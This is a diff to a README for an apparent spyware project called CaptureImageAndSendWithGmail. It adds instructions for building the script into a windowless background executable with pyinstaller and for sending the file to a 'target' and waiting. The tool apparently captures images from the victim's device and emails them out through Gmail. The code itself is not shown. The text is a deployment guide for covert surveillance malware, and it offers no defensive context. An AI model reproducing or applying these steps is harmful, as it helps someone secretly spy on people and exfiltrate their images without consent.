@@ -1,1 +1,1 @@
-# CaptureImageAndSendWithGmail
+First of all, you must change the extention .py to .pyw after downloading the code. We must convert our .pyw file to .exe to run our .exe file in the background on the device. In addition, our .exe file must run in the background without a console. We can get the result we want by writing the following codes in the Command Prompt: pyinstaller --onefile --noconsole CaptureImageAndSendWithGmail.pyw After this process is completed, send this file to target and wait. You will understand the process when you read the code.
